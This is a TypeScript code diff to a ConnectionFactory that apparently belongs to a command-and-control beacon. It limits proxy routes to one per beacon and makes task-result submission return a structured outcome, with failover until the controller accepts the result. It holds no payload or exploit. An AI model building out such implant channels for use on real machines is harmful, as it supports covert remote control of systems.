@@ -22,6 +22,7 @@ import type {
   CheckinPayload,
   Task,
   TaskResult,
+  ResultSubmissionOutcome,
   ConnectionFactoryOptions,
 } from "../types.ts";
 import { OctoProxyTentacle } from '../tentacles/OctoProxyTentacle.ts';
@@ -132,6 +133,11 @@ export class ConnectionFactory {
       switch (kind) {
         case 'proxy': {
           const proxyRepos = config.proxyRepos ?? [];
+          if (proxyRepos.length > 1) {
+            throw new Error(
+              "At most one proxy route may be configured per beacon",
+            );
+          }
           for (const proxyConfig of proxyRepos) {
             tentacles.push(new OctoProxyTentacle(config, proxyConfig));
           }
@@ -270,8 +276,10 @@ export class ConnectionFactory {
    * Submit a task result via the highest-priority available tentacle.
    * Uses the same failover logic as checkin().
    */
-  async submitResult(result: TaskResult): Promise<boolean> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     const tentacles = this.activeTentacles();
+    let artifactWritten = false;
+    let lastWrittenChannel: TentacleKind | null = null;
 
     for (const entry of tentacles) {
       try {
@@ -281,9 +289,23 @@ export class ConnectionFactory {
           continue;
         }
 
-        await entry.tentacle.submitResult(result);
-        this.recordSuccess(entry);
-        return true;
+        const outcome = await entry.tentacle.submitResult(result);
+        if (outcome.artifactWritten) {
+          artifactWritten = true;
+          lastWrittenChannel = outcome.channel ?? entry.tentacle.kind;
+        }
+        if (outcome.controllerAccepted) {
+          this.recordSuccess(entry);
+          return {
+            ...outcome,
+            artifactWritten: artifactWritten || outcome.artifactWritten,
+            channel: outcome.channel ?? entry.tentacle.kind,
+          };
+        }
+        this.recordFailure(entry);
+        log.warn(
+          `Tentacle '${entry.tentacle.kind}' wrote a result artifact without controller acceptance; trying failover`,
+        );
       } catch (err) {
         this.recordFailure(entry);
         log.warn(
@@ -293,7 +315,12 @@ export class ConnectionFactory {
     }
 
     log.error(`Failed to submit result for task ${result.taskId} — all tentacles failed.`);
-    return false;
+    return {
+      artifactWritten,
+      controllerAccepted: false,
+      channel: lastWrittenChannel,
+      acceptance: null,
+    };
   }
 
   // ── Diagnostic ────────────────────────────────────────────────────────────────
